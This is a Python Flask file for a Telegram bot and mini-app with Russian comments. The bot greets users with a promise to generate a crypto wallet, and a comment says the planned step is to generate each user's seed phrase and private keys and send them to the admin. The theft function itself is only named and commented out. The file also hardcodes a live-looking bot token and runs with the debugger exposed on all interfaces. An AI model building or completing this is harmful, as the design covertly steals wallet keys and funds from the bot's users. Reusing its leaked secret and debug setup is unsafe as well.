from flask import Flask, request, send_from_directory
import os
import requests

# === Flask setup ===
app = Flask(__name__, static_folder="miniapp")

@app.route("/")
def serve_index():
    return send_from_directory(app.static_folder, "index.html")

@app.route("/<path:path>")
def serve_static(path):
    return send_from_directory(app.static_folder, path)

# === Telegram Bot config ===
BOT_TOKEN = "7987309610:AAHJkAlbPTxhToO9iyNvnh6I43kacWSP81M"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# === Telegram Webhook Endpoint ===
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    update = request.get_json()

    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        text = update["message"].get("text", "")

        # === Вставим базовую бизнес-логику ===
        if text == "/start":
            send_message(chat_id, "Добро пожаловать! Генерирую ваш криптокошелёк...")
            # Тут будет генерация seed-фразы, приватных ключей и отправка админу
            # create_wallet_for_user(chat_id)
        else:
            send_message(chat_id, "Введите /start для запуска.")

    return "ok", 200

# === Отправка сообщения пользователю ===
def send_message(chat_id, text):
    url = f"{API_URL}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
    }
    requests.post(url, json=payload)

# === Flask порт ===
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port)
